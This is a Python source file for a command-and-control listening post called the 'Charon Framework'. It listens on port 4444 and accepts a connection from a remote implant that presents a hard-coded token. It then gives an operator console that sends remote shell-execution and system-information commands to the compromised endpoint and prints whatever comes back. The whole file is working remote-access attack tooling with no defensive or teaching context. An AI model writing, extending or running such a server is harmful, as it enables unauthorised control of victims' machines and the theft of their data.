#!/usr/bin/env python3
"""
Charon Framework - Standalone Multi-Threaded Core Listening Post
"""

import socket
import struct
import threading
import sys
import time

HEADER_FORMAT = "<IIII"
HEADER_SIZE = struct.calcsize(HEADER_FORMAT)

OP_HEARTBEAT  = 100
OP_SHELL_EXEC = 101
OP_SYS_INFO   = 102
OP_DISCONNECT = 999

class CharonCoreListener:
    def __init__(self, host="0.0.0.0", port=4444, registration_token=994821):
        self.host = host
        self.port = port
        self.token = registration_token
        self.active_session = None
        self.running = True

    def calculate_checksum(self, data: bytes) -> int:
        return sum(data) & 0xFFFFFFFF

    def start(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)
            print(f"[*] Charon Server Core Bound to Port: {self.port}")
        except Exception as e:
            print(f"[-] Infrastructure Bind Error: {e}")
            sys.exit(1)

        threading.Thread(target=self.operator_console, daemon=True).start()

        while self.running:
            try:
                conn, addr = server_socket.accept()
                if self.active_session:
                    conn.close()
                    continue
                threading.Thread(target=self.ingress_pipeline, args=(conn, addr), daemon=True).start()
            except:
                break

    def ingress_pipeline(self, conn, addr):
        try:
            header_bytes = conn.recv(HEADER_SIZE)
            if len(header_bytes) < HEADER_SIZE: return
            sid, op, plen, chk = struct.unpack(HEADER_FORMAT, header_bytes)
            
            if sid != self.token:
                conn.close()
                return

            self.active_session = conn
            print(f"\n[+] Secured Handshake Established with Endpoint: {addr}")
            print("Charon-Shell> ", end="", flush=True)

            while self.running:
                raw_header = conn.recv(HEADER_SIZE)
                if not raw_header: break
                _, top, tplen, _ = struct.unpack(HEADER_FORMAT, raw_header)
                
                payload = b""
                while len(payload) < tplen:
                    chunk = conn.recv(min(tplen - len(payload), 4096))
                    if not chunk: break
                    payload += chunk

                if top == OP_DISCONNECT: break
                print(f"\n[Data Payload Received]:\n{payload.decode('utf-8', errors='ignore')}")
                print("Charon-Shell> ", end="", flush=True)
        except:
            pass
        finally:
            print("\n[-] Active Session Disconnected.")
            self.active_session = None
            conn.close()
            print("Charon-Shell> ", end="", flush=True)

    def dispatch_task(self, opcode, argument=""):
        if not self.active_session:
            print("[-] Error: Direct routing failed. No active target connection.")
            return
        payload_bytes = argument.encode('utf-8')
        header_bytes = struct.pack(HEADER_FORMAT, self.token, opcode, len(payload_bytes), self.calculate_checksum(payload_bytes))
        try:
            self.active_session.sendall(header_bytes + payload_bytes)
        except:
            print("[-] Network Pipe Write Drop Encountered.")

    def operator_console(self):
        while self.running:
            cmd = input("Charon-Shell> ").strip()
            if not cmd: continue
            if cmd == "help":
                print("  info       - Gather basic remote environment specs\n  exec <cmd> - Force process execution natively\n  exit       - Terminate local socket structures")
            elif cmd == "info":
                self.dispatch_task(OP_SYS_INFO)
            elif cmd.startswith("exec "):
                self.dispatch_task(OP_SHELL_EXEC, cmd[5:])
            elif cmd == "exit":
                self.running = False
                if self.active_session: self.active_session.close()
                sys.exit(0)

if __name__ == "__main__":
    server = CharonCoreListener()
    server.start()
